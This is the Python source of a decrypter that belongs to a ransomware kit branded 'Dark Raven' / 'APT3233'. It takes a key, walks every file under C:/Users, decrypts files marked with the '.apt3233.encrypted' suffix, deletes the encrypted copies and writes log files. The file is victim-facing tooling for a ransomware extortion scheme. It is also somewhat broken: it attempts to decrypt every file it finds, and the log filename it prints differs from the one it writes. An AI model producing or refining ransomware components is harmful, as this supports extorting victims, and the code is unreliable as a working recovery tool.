import os
import sys
import errno
import time
from cryptography.fernet import Fernet
from colorama import Fore, Style, init
from datetime import datetime

init()

errors = []

now = datetime.now()
current_datetime = '[' + now.strftime("%Y-%m-%d %H:%M:%S.%f") + '] '

def log_error_2():
    try:
        with open('APT-RANSOMWARE-ERRORS.txt', 'w') as file:
            for error in errors:
                file.write(error + '\n')
    except Exception:
        print(Fore.RED + Style.DIM + current_datetime + 'Really bad error occured. Please directly report to head developer.')

decryptedfiles = [] 

def decrypt_file(file_path):
    decryptedfiles.append(file_path)

    with open(file_path, 'rb') as encrypted_file:
        encrypted_data = encrypted_file.read()
        decrypted_data = cipher_suite.decrypt(encrypted_data)

    decrypted_file_path = file_path.rsplit('.apt3233.encrypted', 1)[0]
    with open(decrypted_file_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)

    os.remove(file_path)

def decrypt_directory(directory_path):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                decrypt_file(file_path)
            except OSError as e:
                if e.errno in (errno.EACCES, errno.EPERM, errno.EINVAL, errno.ENOENT,
                               errno.ENOTDIR, errno.ENAMETOOLONG, errno.EROFS):
                    pass  
            except Exception as e:
                if isinstance(e, (FileNotFoundError, IsADirectoryError, TimeoutError,)):
                    pass  
                else:
                    errors.append(e)

def decrypted_files():
    try:
        with open('APT3233-RANSOMWARE-DECRYPTED-FILES.txt', 'w') as file:
            for decryptedfile in decryptedfiles:
                file.write(decryptedfile + '\n')
    except Exception as e:
        errors.append(e)

def decrypter():
    banner = Fore.RED + Style.DIM + '''  
 ____             _      ____                       
|  _ \  __ _ _ __| | __ |  _ \ __ ___   _____ _ __  
| | | |/ _` | '__| |/ / | |_) / _` \ \ / / _ \ '_ \ 
| |_| | (_| | |  |   <  |  _ < (_| |\ V /  __/ | | |
|____/ \__,_|_|  |_|\_\ |_| \_\__,_| \_/ \___|_| |_|     
                                                    
                                                                                                               
                     
         ================================
                                                           
Welcome to Dark Raven Decrypter!\n\n'''

    print(banner)

    view_key = input(Fore.RED + Style.DIM + current_datetime + 'Please enter your key below...\n-> ')
    # view_key = 'YOUR_KEY_TO_DECRYPT'

    global cipher_suite
    cipher_suite = Fernet(view_key)

    # target_directory = input(Fore.RED + Style.DIM + current_datetime + 'Please enter the directory to decrypt (C:/Users is common) ...\n-> ')
    target_directory = r"C:/Users"

    print(Fore.RED + Style.DIM + current_datetime + 'Starting decryption in 3 seconds...')
    time.sleep(1.0)
    print(Fore.RED + Style.DIM + current_datetime + 'Starting decryption in 2 seconds...')
    time.sleep(1.0)
    print(Fore.RED + Style.DIM + current_datetime + 'Starting decryption in 1 second...')
    time.sleep(1.0)
    print(Fore.RED + Style.DIM + current_datetime + 'Decryption started...')

    decrypt_directory(r'{}'.format(target_directory))

    print(Fore.RED + Style.DIM + current_datetime + 'Finished decryption.')
    print(Fore.RED + Style.DIM + current_datetime + 'Creating overview...')

    decrypted_files()

    log_error_2()

    print(Fore.RED + Style.DIM + current_datetime + 'Finished all. Contents that have been successfully been decrypted can be found in APT3233-RANSOMWARE-DECRYPTER-DECRYPTED-FILES.txt & errors can be found in APT3233-RANSOMWARE-ERRORS.txt')
    print(Fore.RED + Style.DIM + current_datetime + 'Quitting in 5 seconds.')

    time.sleep(5.0)

    sys.exit()

if __name__ == '__main__':
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system('title APT3233 Decrypter')
    decrypter()
